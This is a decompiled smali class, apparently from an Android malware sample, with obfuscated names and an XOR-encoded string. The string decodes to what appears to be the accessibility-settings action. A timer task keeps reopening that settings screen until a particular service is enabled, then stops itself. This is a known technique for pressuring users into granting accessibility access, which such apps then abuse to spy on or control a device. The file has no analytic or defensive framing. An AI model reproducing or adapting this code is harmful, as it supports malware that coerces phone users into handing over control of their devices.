.class Lzvy/zpfypq/bbuhtkwvaf/n;
.super Ljava/util/TimerTask;


# static fields
.field private static final a:Ljava/lang/String;


# instance fields
.field final synthetic b:Lzvy/zpfypq/bbuhtkwvaf/w;

.field final synthetic c:Ljava/util/Timer;

.field final synthetic d:Landroid/content/Intent;


# direct methods
.method static constructor <clinit>()V
    .locals 8

    const-string v0, "5QP\u0008\u000c=[\u001a\t\u0006 K]\u0014\u0004\'\u0011u9 \u0011lg3!\u001ds}.:\u000blq.7\u001dqs)"

    invoke-virtual {v0}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    array-length v1, v0

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-gt v1, v3, :cond_2

    :cond_0
    move-object v3, v0

    move v4, v2

    move v7, v1

    move-object v1, v0

    move v0, v7

    :goto_0
    aget-char v6, v1, v2

    rem-int/lit8 v5, v4, 0x5

    packed-switch v5, :pswitch_data_0

    const/16 v5, 0x63

    :goto_1
    xor-int/2addr v5, v6

    int-to-char v5, v5

    aput-char v5, v1, v2

    add-int/lit8 v2, v4, 0x1

    if-nez v0, :cond_1

    move-object v1, v3

    move v4, v2

    move v2, v0

    goto :goto_0

    :cond_1
    move v1, v0

    move-object v0, v3

    :cond_2
    if-gt v1, v2, :cond_0

    new-instance v1, Ljava/lang/String;

    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lzvy/zpfypq/bbuhtkwvaf/n;->a:Ljava/lang/String;

    return-void

    :pswitch_0
    const/16 v5, 0x54

    goto :goto_1

    :pswitch_1
    const/16 v5, 0x3f

    goto :goto_1

    :pswitch_2
    const/16 v5, 0x34

    goto :goto_1

    :pswitch_3
    const/16 v5, 0x7a

    goto :goto_1

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method

.method constructor <init>(Lzvy/zpfypq/bbuhtkwvaf/w;Landroid/content/Intent;Ljava/util/Timer;)V
    .locals 0

    iput-object p1, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->b:Lzvy/zpfypq/bbuhtkwvaf/w;

    iput-object p2, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->d:Landroid/content/Intent;

    iput-object p3, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->c:Ljava/util/Timer;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    :try_start_0
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/s;->a:Ljava/lang/String;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->b:Lzvy/zpfypq/bbuhtkwvaf/w;

    iget-object v1, v1, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->b:Lzvy/zpfypq/bbuhtkwvaf/w;

    iget-object v0, v0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-object v0, v0, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->c:[I

    const/4 v1, 0x0

    const/16 v2, 0xc8

    aput v2, v0, v1

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/n;->a:Ljava/lang/String;

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->b:Lzvy/zpfypq/bbuhtkwvaf/w;

    iget-object v1, v1, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->startActivity(Landroid/content/Intent;)V

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->b:Lzvy/zpfypq/bbuhtkwvaf/w;

    iget-object v0, v0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->d:Landroid/content/Intent;

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->stopService(Landroid/content/Intent;)Z

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->b:Lzvy/zpfypq/bbuhtkwvaf/w;

    const/4 v1, 0x0

    iput-boolean v1, v0, Lzvy/zpfypq/bbuhtkwvaf/w;->a:Z

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->c:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/n;->b:Lzvy/zpfypq/bbuhtkwvaf/w;

    iget-object v0, v0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-object v0, v0, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->c:[I

    const/4 v1, 0x0

    const/4 v2, 0x0

    aput v2, v0, v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0
.end method
